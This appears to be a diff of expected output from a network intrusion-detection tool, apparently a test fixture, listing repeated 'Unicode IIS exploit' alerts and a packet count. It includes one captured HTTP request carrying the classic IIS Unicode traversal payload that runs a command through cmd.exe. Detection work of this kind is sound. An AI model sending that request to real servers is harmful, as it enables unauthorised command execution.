@@ -1,63 +1,377 @@
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
+
+
+
+
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
+
+get /scripts/..%c1%af../winnt/system32/cmd.exe?/c+dir+c:\ http/1.1
+host: 8.58.39.40
+connection: close
+
+
+
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
+
+
 [Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
-[Unicode IIS exploit]: src:10.9.9.9, dst:8.58.39.40
+
+
+
+
 Analyzed 713 packets, 186090 bytes
